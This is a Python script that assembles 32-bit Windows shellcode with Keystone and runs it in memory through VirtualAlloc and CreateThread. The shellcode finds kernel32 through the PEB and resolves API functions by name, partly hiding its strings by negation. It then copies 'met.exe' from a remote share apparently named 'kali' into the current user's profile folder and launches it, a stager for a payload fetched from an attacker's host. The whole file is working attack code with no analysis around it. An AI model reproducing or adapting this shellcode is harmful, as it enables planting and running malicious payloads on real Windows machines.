import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   mov   ebp, esp                  ;"  #

    "find_kernel32:                     ;"  #
    "   xor ecx, ecx                    ;"  # ECX = 0
    "   mov eax, fs:[ecx + 0x30]        ;"  # EAX = PEB
    "   mov eax, [eax + 0xc]            ;"  # EAX = PEB -> Ldr
    "   mov esi, [eax + 0x14]           ;"  # ESI = PEB -> Ldr.InMemOrder
    "   lodsd                           ;"  # EAX = Second module
    "   xchg eax, esi                   ;"  # EAX <=> ESI
    "   lodsd                           ;"  # EAX = Third(kernel32)
    "   mov ebx, [eax + 0x10]           ;"  # EBX = Kernel32 base address
    "   mov edx, [ebx + 0x3c]           ;"  # EDX = DOS -> e_lfanew
    "   add edx, ebx                    ;"  # EDX = PE Header
    "   mov edx, [edx + 0x78]           ;"  # EDX = Offset export table
    "   add edx, ebx                    ;"  # EDX = Export table
    "   mov esi, [edx + 0x20]           ;"  # ESI = Offset name table
    "   add esi, ebx                    ;"  # ESI = Names tables
    "   xor ecx, ecx                    ;"  # ECX = 0
    
    "Get_Function:                      ;"  #
    "   inc ecx                         ;"  # ECX = 1
    "   lodsd                           ;"  # Get name offset
    "   add eax, ebx                    ;"  # Get function name
    "   cmp dword ptr[eax], 0x50746547  ;"  # GetP
    "   jnz Get_Function                ;"  #
    "   cmp dword ptr[eax + 0x4], 0x41636f72;"  # rocA 
    "   jnz Get_Function                ;"  #
    "   cmp dword ptr[eax + 0x8], 0x65726464;"  # ddre
    "   jnz Get_Function                ;"  #
    "   mov esi, [edx + 0x24]           ;"  # ESi = Offset ordinals
    "   add esi, ebx                    ;"  # ESI = Ordinals table
    "   mov cx, [esi + ecx * 2]         ;"  # CX = Number of function
    "   dec ecx                         ;"  # ECX = -1
    "   mov esi, [edx + 0x1c]           ;"  # ESI = Offset address table
    "   add esi, ebx                    ;"  # ESI = Address table
    "   mov edx, [esi + ecx * 4]        ;"  # EDX = Pointer(offset)
    "   add edx, ebx                    ;"  # EDX = GetProcAddress
    "   mov [ebp], ebx                  ;"  # [EBP] = Kernel32
    "   mov [ebp + 4], edx              ;"  # [EBP+4] = GetProcAddressStub

    "LoadLibrary:                       ;"  #
    "   xor ecx, ecx                    ;"  # ECX = 0
    "   push ecx                        ;"  # ECX = 0
    "   push 0x41797261                 ;"  # aryA
    "   push 0x7262694c                 ;"  # Libr
    "   push 0x64616f4c                 ;"  # Load
    "   push esp                        ;"  # "LoadLibrary"
    "   push [ebp]                      ;"  # Kernel32 base address
    "   call [ebp + 4]                  ;"  # GetProcAddress(LL) | if success, LoadLibrary address should be at EAX
    "   mov [ebp + 8], eax              ;"  # [EBP+8] = LoadLibraryAStub

    "Load_User32.dll:                   ;" 
    "   add esp, 0xc                    ;"  # 'clean stack'
    "   pop ecx                         ;"  # ECX = 0
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   mov cx, 0x6c6c                  ;"  # ll
    "   push ecx                        ;"  # ECX = ll -> ESP
    "   push 0x642e3233                 ;"  # 32.d
    "   push 0x72657355                 ;"  # User
    "   push esp                        ;"  # "User32.dll"
    "   call [ebp + 8]                  ;"  # LoadLibrary("User32.dll")
    "   mov [ebp + 0xC], eax            ;"  # [EBP+C] = User32.dll

    "Load_Advapi32.dll:                 ;"
    "   xor ecx, ecx                    ;"  # ECX = 0
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   push 0x6c6c642e                 ;"  # .dll
    "   push 0x32336970                 ;"  # pi32
    "   push 0x61766441                 ;"  # Adva
    "   push esp                        ;"  # "Advapi32.dll"
    "   call [ebp + 8]                  ;"  # LoadLibrary("Advapi32.dll")
    "   mov [ebp + 0x10], eax           ;"  # [EBP+10] = Advapi32.dll

    "GPA_GetUserNameA:                  ;"
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   push 0x41656d61                 ;"  # ameA
    "   push 0x4e726573                 ;"  # serN
    "   push 0x55746547                 ;"  # GetU
    "   push esp                        ;"  # "GetUserNameA"
    "   push [ebp + 0x10]               ;"  # Advapi32 base address
    "   call [ebp + 4]                  ;"  # GetProcAddress(GetUserNameA) | if success, GetUserNameA address should be at EAX
    "   mov [ebp + 0x14], eax           ;"  # Put GetUserNameA into [EBP+14]

    "GPA_CopyFileExA:                   ;"
    "   xor ecx, ecx                    ;"  # ECX = 0
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   mov ecx, 0xffbe87bb             ;"  # 
    "   neg ecx                         ;"  # 
    "   push ecx                        ;"  # ECX -> ESP
    "   push 0x656c6946                 ;"  # 
    "   push 0x79706f43                 ;"  # 
    "   push esp                        ;"  # "CopyFileExA"
    "   push [ebp]                      ;"  # Kernel32 base address
    "   call [ebp + 4]                  ;"  # GetProcAddress(CopyFileExA) | if success, CopyFileExA address should be at EAX
    "   mov [ebp + 0x34], eax           ;"  # Put CopyFileExA into [EBP+34]

    "GPA_CreateProcessA:                   ;"
    "   xor ecx, ecx                    ;"  # ECX = 0
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   mov  eax, 0xffffbe8d            ;"  # 
    "   neg  eax                        ;"  # 
    "   push eax                        ;"  # 
    "   push 0x7365636f                 ;"  # 
    "   push 0x72506574                 ;"  # 
    "   push 0x61657243                 ;"  # 
    "   push esp                        ;"  # "CreateProcessA"
    "   push [ebp]                      ;"  # Kernel32 base address
    "   call [ebp + 4]                  ;"  # GetProcAddress(CreateProcessA) | if success, CreateProcessA address should be at EAX
    "   mov [ebp + 0x38], eax           ;"  # Put CreateProcessA into [EBP+38]

    "GPA_TerminateProcess:              ;"
    "   push ecx                        ;"  # ECX = 0 -> ESP
    "   push 0x73736563                 ;"  # 
    "   push 0x6f725065                 ;"  # 
    "   push 0x74616e69                 ;"  # 
    "   push 0x6d726554                 ;"  # 
    "   push esp                        ;"  # "TerminateProcess"
    "   push [ebp]                      ;"  # Kernel32 base address
    "   call [ebp + 4]                  ;"  # GetProcAddress(TerminateProcess) | if success, TerminateProcess address should be at EAX
    "   mov [ebp + 0x46], eax           ;"  # Put TerminateProcess into [EBP+46]

    "Call_GetUserNameA:                 ;"
    "   sub esp, 0x0A                   ;"  # ESP - 0x0A (10)
    "   mov edx, esp                    ;"  # ESP -> EDX
    "   mov [ebp + 0x1C], edx           ;"  # [EBP + 0x1C] = Username
    "   sub esp, 0x0A                   ;"  # ESP - 0x0A (10) - Saves another area to store the pointer
    "   mov ecx, esp                    ;"  # ESP -> ECX
    "   push ecx                        ;"  # ECX -> ESP
    "   push edx                        ;"  # EDX -> ESP
    "   call [ebp + 0x14]               ;"  # GetUserNameA

    " create_src_string:                 "  #
    "   mov   eax, 0xffff9a88           ;"  #   Move ffff9a88 into EAX
    "   neg   eax                       ;"  #   
    "   push  eax                       ;"  #  
    "   push  0x652e7465                ;"  #  
    "   push  0x6d5c7465                ;"  #  
    "   push  0x6d5c696c                ;"  #  
    "   push  0x616b5c5c                ;"  #  
    "   push  esp                       ;"  #   
    "   pop   ebx                       ;"  #   Store pointer to the "\\kali\met\met.exe" string in EBX

    " create_dst_string:                "  # 
    "   sub   esp, 0x100                ;"  #   Reserve 256 bytes for full path
    "   mov   edi, esp                  ;"  #   EDI = destination buffer
    "   push  0x0000005c                ;"  #   Push "\" (null-padded)
    "   push  0x73726573                ;"  #   Push "sers"  
    "   push  0x555c3a43                ;"  #   Push "C:\U"
    "   mov   esi, esp                  ;"  #   ESI = source ("C:\Users\")
    "   mov   ecx, 9                    ;"  #   Length of "C:\Users\"
    "   rep   movsb                     ;"  #   Copy "C:\Users\" to buffer
    "   add   esp, 12                   ;"  #   Clean up pushed string
    "   mov   eax, [ebp + 0x1C]         ;"  #   'username' structure
    "   mov   esi, [ebp + 0x1C]         ;"  #   ESI = username string pointer
    "   mov   ecx, 6                    ;"  #   ECX = username length
    "   rep   movsb                     ;"  #   Copy username after "C:\Users\"
    "   mov   edx, 0xff9a879b           ;"  #   
    "   push  0x6578652e                ;"  #   
    "   push  0x74656d5c                ;"  #   
    "   mov   esi, esp                  ;"  #   
    "   mov   ecx, 8                    ;"  #   
    "   rep   movsb                     ;"  #   Copy met.exe
    "   xor   eax, eax                  ;"  #   Null terminate
    "   mov   [edi], eax                ;"  #   Null terminate
    "   pop   eax                       ;"  # remove \met from esp
    "   pop   eax                       ;"  # remove .exe from esp
    "   mov   edx, esp                  ;"  #   EDX = pointer to complete "C:\Users\Username\met.exe" string
    "   mov   [ebp+0x42], esp           ;"  #   storing in filepath for createprocess

    "Call_CopyFileEx:                   ;"
    "   xor   eax, eax                  ;"  #   EAX = 0 
    "   push  eax                       ;"  #   dwCopyFlags (0 = no special flags)
    "   push  eax                       ;"  #   pbCancel (NULL)
    "   push  eax                       ;"  #   lpData (NULL) 
    "   push  eax                       ;"  #   lpProgressRoutine (NULL)
    "   push  edx                       ;"  #   lpNewFileName (destination)
    "   push  ebx                       ;"  #   lpExistingFileName (source)
    "   call  dword ptr [ebp+0x34]      ;"  #   Call CopyFileEx

    " create_startupinfoa:               "  #
    "   xor eax, eax                    ;"
    "   push eax                    ;"
    "   push  esi                       ;"  #   Push hStdError
    "   push  esi                       ;"  #   Push hStdOutput
    "   push  esi                       ;"  #   Push hStdInput
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpReserved2
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x80                  ;"  #   Move 0x80 to CX
    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
    "   push  eax                       ;"  #   Push dwFlags
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push dwFillAttribute
    "   push  eax                       ;"  #   Push dwYCountChars
    "   push  eax                       ;"  #   Push dwXCountChars
    "   push  eax                       ;"  #   Push dwYSize
    "   push  eax                       ;"  #   Push dwXSize
    "   push  eax                       ;"  #   Push dwY
    "   push  eax                       ;"  #   Push dwX
    "   push  eax                       ;"  #   Push lpTitle
    "   push  eax                       ;"  #   Push lpDesktop
    "   push  eax                       ;"  #   Push lpReserved
    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL
    "   push  eax                       ;"  #   Push cb
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI

    " create_cmd_string:                 "  #
    "   mov   ebx, [ebp+0x42]                   ;"  #   Store pointer to the filepath string in EBX

    " call_createprocessa:               "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpProcessInformation
    "   push  edi                       ;"  #   Push lpStartupInfo
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpCurrentDirectory
    "   push  eax                       ;"  #   Push lpEnvironment
    "   push  eax                       ;"  #   Push dwCreationFlags
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
    "   push  eax                       ;"  #   Push bInheritHandles
    "   dec   eax                       ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpThreadAttributes
    "   push  eax                       ;"  #   Push lpProcessAttributes
    "   push  ebx                       ;"  #   Push lpCommandLine
    "   push  eax                       ;"  #   Push lpApplicationName
    "   call dword ptr [ebp + 0x38]     ;"  #   Call CreateProcessA

    "Call_TerminateProcess:             ;"
    "   xor ecx, ecx                    ;"  # EAX = 0
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call dword ptr [ebp+0x46]       ;"  #   Call TerminateProcess
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
